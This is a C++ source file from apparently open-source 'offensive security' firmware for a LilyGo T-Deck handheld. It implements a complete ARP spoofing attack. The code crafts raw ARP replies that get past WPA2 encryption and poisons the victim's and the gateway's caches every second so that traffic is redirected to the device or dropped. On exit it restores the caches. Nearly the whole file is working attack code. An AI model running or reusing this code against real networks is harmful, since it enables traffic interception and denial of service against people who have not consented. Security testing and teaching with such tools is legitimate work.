// T-REX — offensive security firmware for LilyGo T-DECK
// SPDX-License-Identifier: AGPL-3.0-or-later
// Copyright (C) 2026 Abdallah Natsheh
//
// arpspoof / as — see arpspoof.h.
//
// ARP-reply injection uses a raw ethernet+ARP frame handed to the STA netif's
// linkoutput(): the WiFi driver encrypts it with the pairwise key, so the frame
// is accepted on WPA2 (esp_wifi_80211_tx would NOT encrypt). Technique mirrors
// Bruce firmware's src/modules/ethernet/ARPoisoner.cpp (AGPL-3.0; NOTICES).

#include "arpspoof.h"

#include <Arduino.h>
#include <WiFi.h>
#include <esp_wifi.h>
#include <lwip/etharp.h>
#include <lwip/netif.h>
#include <lwip/tcpip.h>

#include "display_manager.h"
#include "input_handling.h"
#include "network_scanner.h"   // resolveNetTarget()

extern DisplayManager displayManager;
extern InputHandling  inputHandler;

// ── raw ARP-reply frame (built by byte offset — no packed-struct alignment risk)
// Layout (ETH_PAD_SIZE=0 on ESP32): eth(14) + arp(28) = 42 bytes.
static void asSendArpReply(struct netif* nif,
                           const IPAddress& senderIp, const uint8_t senderMac[6],
                           const IPAddress& targetIp, const uint8_t targetMac[6]) {
    const uint16_t LEN = 42;
    struct pbuf* p = pbuf_alloc(PBUF_RAW, LEN, PBUF_RAM);
    if (!p) return;
    uint8_t* b = (uint8_t*)p->payload;

    memcpy(b + 0, targetMac, 6);          // eth.dest = victim
    memcpy(b + 6, senderMac, 6);          // eth.src  = us (spoofed sender)
    b[12] = 0x08; b[13] = 0x06;           // ethertype = ARP
    b[14] = 0x00; b[15] = 0x01;           // hwtype = Ethernet
    b[16] = 0x08; b[17] = 0x00;           // proto  = IPv4
    b[18] = 0x06;                         // hwlen
    b[19] = 0x04;                         // protolen
    b[20] = 0x00; b[21] = 0x02;           // opcode = REPLY
    memcpy(b + 22, senderMac, 6);         // sender hw
    b[28] = senderIp[0]; b[29] = senderIp[1]; b[30] = senderIp[2]; b[31] = senderIp[3];
    memcpy(b + 32, targetMac, 6);         // target hw
    b[38] = targetIp[0]; b[39] = targetIp[1]; b[40] = targetIp[2]; b[41] = targetIp[3];

    LOCK_TCPIP_CORE();
    if (nif && nif->linkoutput) nif->linkoutput(nif, p);
    UNLOCK_TCPIP_CORE();
    pbuf_free(p);
}

// Resolve a live host's MAC by ARPing it (works for IP / nd# / ns# targets alike:
// we're associated, so a request gets a reply that lwip caches). Polls 'q'.
static bool asResolveMac(struct netif* nif, const IPAddress& ip, uint8_t mac[6]) {
    ip4_addr_t t;
    IP4_ADDR(&t, ip[0], ip[1], ip[2], ip[3]);
    for (int attempt = 0; attempt < 10; attempt++) {
        LOCK_TCPIP_CORE();
        etharp_request(nif, &t);
        UNLOCK_TCPIP_CORE();
        delay(120);
        struct eth_addr* eth = nullptr;
        const ip4_addr_t* ipr = nullptr;
        LOCK_TCPIP_CORE();
        s8_t hit = etharp_find_addr(nif, &t, &eth, &ipr);
        UNLOCK_TCPIP_CORE();
        if (hit >= 0 && eth) { memcpy(mac, eth->addr, 6); return true; }
        if (inputHandler.getKeyboardInput() == 'q') return false;
    }
    return false;
}

static String asMacStr(const uint8_t m[6]) {
    char s[18];
    snprintf(s, sizeof(s), "%02X:%02X:%02X:%02X:%02X:%02X", m[0], m[1], m[2], m[3], m[4], m[5]);
    return String(s);
}

void runArpSpoof(char* args) {
    DisplayManager& dm = displayManager;

    if (WiFi.status() != WL_CONNECTED) {
        dm.clearScreen();
        dm.setTextColor(TFT_RED);
        dm.println("Not connected. Run `cw` first.");
        delay(1800);
        return;
    }

    // Parse: as <victim> [gateway]
    String a = args ? String(args) : "";
    a.trim();
    String vTok = a, gTok = "";
    int sp = a.indexOf(' ');
    if (sp >= 0) { vTok = a.substring(0, sp); gTok = a.substring(sp + 1); gTok.trim(); }

    if (vTok.isEmpty()) {
        dm.clearScreen();
        dm.setTextColor(TFT_YELLOW);
        dm.println("Usage: as <victim> [gateway]");
        dm.setTextColor(TFT_WHITE);
        dm.println("victim = ip | nd# | ns#  (run nd/ns first)");
        dm.println("gateway defaults to the current gateway.");
        delay(2600);
        return;
    }

    IPAddress victimIp, gwIp;
    if (!resolveNetTarget(vTok, victimIp)) {
        dm.clearScreen(); dm.setTextColor(TFT_RED);
        dm.println("Bad victim: " + vTok); delay(1800); return;
    }
    if (!gTok.isEmpty()) {
        if (!resolveNetTarget(gTok, gwIp)) {
            dm.clearScreen(); dm.setTextColor(TFT_RED);
            dm.println("Bad gateway: " + gTok); delay(1800); return;
        }
    } else {
        gwIp = WiFi.gatewayIP();
    }

    struct netif* nif = netif_default;
    uint8_t ourMac[6];
    esp_wifi_get_mac(WIFI_IF_STA, ourMac);

    // Resolve both endpoints' real MACs (also confirms they're reachable).
    dm.clearScreen();
    dm.setTextColor(TFT_CYAN);
    dm.println("[ARP::SPOOF] resolving MACs...");
    dm.setTextColor(TFT_WHITE);
    dm.println("victim  " + victimIp.toString());
    dm.println("gateway " + gwIp.toString());

    uint8_t victimMac[6], gwMac[6];
    if (!asResolveMac(nif, victimIp, victimMac)) {
        dm.setTextColor(TFT_RED); dm.println("Victim MAC unresolved (offline?)."); delay(2000); return;
    }
    if (!asResolveMac(nif, gwIp, gwMac)) {
        dm.setTextColor(TFT_RED); dm.println("Gateway MAC unresolved."); delay(2000); return;
    }

    // ── static screen (drawn once), stats updated in place ────────────────────
    dm.clearScreen();
    int y = 40;
    dm.setTextColor(TFT_RED);    dm.setCursor(10, y); dm.printText("[ARP::SPOOF]  [EXP]"); y += 18;
    dm.setTextColor(0x7BEF);     dm.setCursor(10, y); dm.printText("redirect/DoS - no forwarding (1 radio)"); y += 18;
    dm.setTextColor(TFT_WHITE);
    dm.setCursor(10, y); dm.printText("victim  " + victimIp.toString() + " " + asMacStr(victimMac)); y += 14;
    dm.setCursor(10, y); dm.printText("gateway " + gwIp.toString() + " " + asMacStr(gwMac)); y += 14;
    dm.setCursor(10, y); dm.printText("as      " + asMacStr(ourMac)); y += 20;
    const int statY = y;
    dm.setCursor(10, y + 20); dm.setTextColor(0x7BEF); dm.printText("[q] stop + heal caches");

    uint32_t pkts = 0, lastTx = 0, lastDraw = 0;
    bool stop = false;
    while (!stop) {
        uint32_t now = millis();
        if (now - lastTx >= 1000) {
            lastTx = now;
            // victim: "gateway is at us"
            asSendArpReply(nif, gwIp,     ourMac, victimIp, victimMac);
            // gateway: "victim is at us"
            asSendArpReply(nif, victimIp, ourMac, gwIp,     gwMac);
            pkts += 2;
        }
        if (now - lastDraw >= 500) {
            lastDraw = now;
            dm.fillRect(10, statY, SCREEN_WIDTH - 20, 16, TFT_BLACK);
            dm.setCursor(10, statY);
            dm.setTextColor(TFT_GREEN);
            char line[40];
            snprintf(line, sizeof(line), "POISONING  sent %lu", (unsigned long)pkts);
            dm.printText(line);
        }
        if (inputHandler.getKeyboardInput() == 'q') stop = true;
        delay(20);
    }

    // ── heal: restore real MACs on both ends ──────────────────────────────────
    dm.fillRect(10, statY, SCREEN_WIDTH - 20, 16, TFT_BLACK);
    dm.setCursor(10, statY); dm.setTextColor(TFT_YELLOW); dm.printText("healing caches...");
    for (int i = 0; i < 5; i++) {
        asSendArpReply(nif, gwIp,     gwMac,     victimIp, victimMac);   // gateway is at gwMac
        asSendArpReply(nif, victimIp, victimMac, gwIp,     gwMac);       // victim  is at victimMac
        delay(120);
    }
    // Leave WiFi initialised + idle (GDMA rule: never WIFI_OFF/disconnect(true)).
}
